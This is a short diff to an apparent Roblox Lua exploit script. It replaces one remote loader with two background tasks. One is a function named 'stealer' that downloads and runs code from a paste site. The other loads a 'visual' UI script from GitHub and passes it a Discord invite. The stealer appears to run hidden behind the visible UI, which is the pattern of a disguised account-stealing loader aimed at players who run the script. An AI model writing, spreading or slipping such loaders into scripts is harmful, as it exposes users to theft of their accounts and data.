@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/PE1J6rE2rwtG0YLj/raw", true))()
+local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/'))() -- loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/PE1J6rE2rwtG0YLj/raw", true))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
